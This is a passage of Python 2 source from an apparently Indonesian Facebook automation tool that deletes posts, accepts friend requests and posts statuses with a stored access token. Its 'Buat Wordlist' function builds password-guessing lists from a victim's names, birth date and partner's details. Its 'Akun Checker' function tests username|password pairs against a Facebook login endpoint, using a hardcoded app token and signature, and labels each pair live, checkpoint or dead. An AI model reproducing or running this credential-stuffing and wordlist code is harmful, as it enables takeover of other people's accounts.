    asu = requests.get('https://graph.facebook.com/me/feed?access_token=' + toket)
    asus = json.loads(asu.text)
    for p in asus['data']:
        id = p['id']
        piro = 0
        url = requests.get('https://graph.facebook.com/' + id + '?method=delete&access_token=' + toket)
        ok = json.loads(url.text)
        try:
            error = ok['error']['message']
            print '\x1b[1;91m[\x1b[1;97m' + id[:10].replace('\n', ' ') + '...' + '\x1b[1;91m] \x1b[1;95mGagal'
        except TypeError:
            print '\x1b[1;92m[\x1b[1;97m' + id[:10].replace('\n', ' ') + '...' + '\x1b[1;92m] \x1b[1;96mTerhapus'
            piro += 1
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[!] Koneksi Error'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_bot()

    print '\x1b[1;91m[+] \x1b[1;97mSelesai'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
    menu_bot()


def accept():
    os.system('reset')
    print random.choice(logo)
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('reset')
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    print random.choice(logo)
    print 40 * '\x1b[1;97m='
    limit = raw_input('\x1b[1;91m[!] \x1b[1;92mMasukan limit \x1b[1;91m:\x1b[1;97m ')
    r = requests.get('https://graph.facebook.com/me/friendrequests?limit=' + limit + '&access_token=' + toket)
    teman = json.loads(r.text)
    if '[]' in str(teman['data']):
        print '\x1b[1;91m[!] Tidak ada permintaan pertemanan'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
        menu_bot()
    jalan('\x1b[1;91m[+] \x1b[1;92mMulai \x1b[1;97m...')
    print
    print 40 * '\x1b[1;97m='
    for i in teman['data']:
        gas = requests.post('https://graph.facebook.com/me/friends/' + i['from']['id'] + '?access_token=' + toket)
        a = json.loads(gas.text)
        if 'error' in str(a):
            print '\x1b[1;91m[+] \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + i['from']['name']
            print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + i['from']['id'] + '\x1b[1;91m Gagal'
            print 40 * '\x1b[1;97m='
        else:
            print '\x1b[1;91m[+] \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + i['from']['name']
            print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + i['from']['id'] + '\x1b[1;92m Berhasil'
            print 40 * '\x1b[1;97m='

    print '\x1b[1;91m[+] \x1b[1;97mSelesai'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
    menu_bot()


def unfriend():
    os.system('reset')
    print random.choice(logo)
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('reset')
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    print random.choice(logo)
    print 40 * '\x1b[1;97m='
    print '\x1b[1;91m[!] Sorry bro, belum bisa di pakai :v'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
    menu_bot()


def lain():
    os.system('reset')
    print random.choice(logo)
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('reset')
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    print random.choice(logo)
    print 40 * '\x1b[1;97m='
    print '\x1b[1;91m1. \x1b[1;97mBuat postingan'
    print '\x1b[1;91m2. \x1b[1;97mBuat Wordlist'
    print '\x1b[1;91m3. \x1b[1;97mAkun Checker'
    print
    print '\x1b[1;97m  ->Coming soon<-'
    print
    print '\x1b[1;91m0. Kembali'
    print
    pilih_lain()


def pilih_lain():
    other = raw_input('\x1b[1;91m>\x1b[1;97m ')
    if other == '':
        print '\x1b[1;91m[!] Jangan kosong'
        pilih_lain()
    elif other == '1':
        status()
    elif other == '2':
        wordlist()
    elif other == '3':
        check_akun()
    elif other == '0':
        menu()
    else:
        print '\x1b[1;91m[!] \x1b[1;97m' + other + ' \x1b[1;91mTidak ada'
        pilih_lain()


def status():
    os.system('reset')
    print random.choice(logo)
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('reset')
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    print random.choice(logo)
    print 40 * '\x1b[1;97m='
    msg = raw_input('\x1b[1;91m[+] \x1b[1;92mKetik status \x1b[1;91m:\x1b[1;97m ')
    if msg == '':
        print '\x1b[1;91m[!] Jangan kosong'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
        lain()
    else:
        res = requests.get('https://graph.facebook.com/me/feed?method=POST&message=' + msg + '&access_token=' + toket)
        op = json.loads(res.text)
        jalan('\x1b[1;91m[+] \x1b[1;92mMengirim\x1b[1;97m ...')
        print '\x1b[1;91m[+] \x1b[1;92mStatus ID\x1b[1;91m : \x1b[1;97m' + op['id']
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
        lain()


def wordlist():
    os.system('reset')
    print random.choice(logo)
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('reset')
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('reset')
            print random.choice(logo)
            print 40 * '\x1b[1;97m='
            print '\x1b[1;91m[?] \x1b[1;92mIsi data dibawah'
            print 40 * '\x1b[1;97m='
            print
            a = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Depan \x1b[1;97m: ')
            file = open(a + '.txt', 'w')
            b = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Tengah \x1b[1;97m: ')
            c = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Belakang \x1b[1;97m: ')
            d = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Panggilan \x1b[1;97m: ')
            e = raw_input('\x1b[1;91m[+] \x1b[1;92mTanggal Lahir >\x1b[1;96mex: |DDMMYY| \x1b[1;97m: ')
            f = e[0:2]
            g = e[2:4]
            h = e[4:]
            print 40 * '\x1b[1;97m='
            print '\x1b[1;91m[?] \x1b[1;93mKalo Jomblo SKIP aja :v'
            i = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Pacar \x1b[1;97m: ')
            j = raw_input('\x1b[1;91m[+] \x1b[1;92mNama Panggilan Pacar \x1b[1;97m: ')
            k = raw_input('\x1b[1;91m[+] \x1b[1;92mTanggal Lahir Pacar >\x1b[1;96mex: |DDMMYY| \x1b[1;97m: ')
            l = k[0:2]
            m = k[2:4]
            n = k[4:]
            file.write('%s%s\n%s%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s' % (a, c, a, b, b, a, b, c, c, a, c, b, a, a, b, b, c, c, a, d, b, d, c, d, d, d, d, a, d, b, d, c, a, e, a, f, a, g, a, h, b, e, b, f, b, g, b, h, c, e, c, f, c, g, c, h, d, e, d, f, d, g, d, h, e, a, f, a, g, a, h, a, e, b, f, b, g, b, h, b, e, c, f, c, g, c, h, c, e, d, f, d, g, d, h, d, d, d, a, f, g, a, g, h, f, g, f, h, f, f, g, f, g, h, g, g, h, f, h, g, h, h, h, g, f, a, g, h, b, f, g, b, g, h, c, f, g, c, g, h, d, f, g, d, g, h, a, i, a, j, a, k, i, e, i, j, i, k, b, i, b, j, b, k, c, i, c, j, c, k, e, k, j, a, j, b, j, c, j, d, j, j, k, a, k, b, k, c, k, d, k, k, i, l, i, m, i, n, j, l, j, m, j, n, j, k))
            wg = 0
            while wg < 100:
                wg = wg + 1
                file.write(a + str(wg) + '\n')

            en = 0
            while en < 100:
                en = en + 1
                file.write(i + str(en) + '\n')

            word = 0
            while word < 100:
                word = word + 1
                file.write(d + str(word) + '\n')

            gen = 0
            while gen < 100:
                gen = gen + 1
                file.write(j + str(gen) + '\n')

            file.close()
            time.sleep(1.5)
            print '\n\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m: \x1b[1;97m %s.txt' % a
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            lain()
        except IOError as e:
            print '\x1b[1;91m[!] Gagal membuat file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            lain()


def check_akun():
    os.system('reset')
    print random.choice(logo)
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('reset')
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('reset')
        print random.choice(logo)
        print 40 * '\x1b[1;97m='
        print '\x1b[1;91m[?] \x1b[1;92mIsi File\x1b[1;91m : \x1b[1;97musername | password'
        print 40 * '\x1b[1;97m='
        live = []
        cek = []
        die = []
        try:
            file = raw_input('\x1b[1;91m[+] \x1b[1;92mFile \x1b[1;91m:\x1b[1;97m ')
            list = open(file, 'r').readlines()
        except IOError:
            print '\x1b[1;91m[!] File tidak ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            lain()

    pemisah = raw_input('\x1b[1;91m[+] \x1b[1;92mPemisah \x1b[1;91m:\x1b[1;97m ')
    jalan('\x1b[1;91m[+] \x1b[1;92mMulai\x1b[1;97m ...')
    print
    print 40 * '\x1b[1;97m='
    for meki in list:
        username, password = meki.strip().split(str(pemisah))
        url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + password + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
        data = requests.get(url)
        mpsh = json.loads(data.text)
        if 'access_token' in mpsh:
            live.append(password)
            print '\x1b[1;97m[\x1b[1;92mLive\x1b[1;97m]  \x1b[1;97m' + username + ' | ' + password
        elif 'www.facebook.com' in mpsh['error_msg']:
            cek.append(password)
            print '\x1b[1;97m[\x1b[1;93mCheck\x1b[1;97m] \x1b[1;97m' + username + ' | ' + password
        else:
            die.append(password)
            print '\x1b[1;97m[\x1b[1;91mMati\x1b[1;97m]  \x1b[1;97m' + username + ' | ' + password

    print '\n\x1b[1;91m[+] \x1b[1;97mTotal\x1b[1;91m : \x1b[1;97mLive=\x1b[1;92m' + str(len(live)) + ' \x1b[1;97mCheck=\x1b[1;93m' + str(len(cek)) + ' \x1b[1;97mDie=\x1b[1;91m' + str(len(die))
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
    lain()


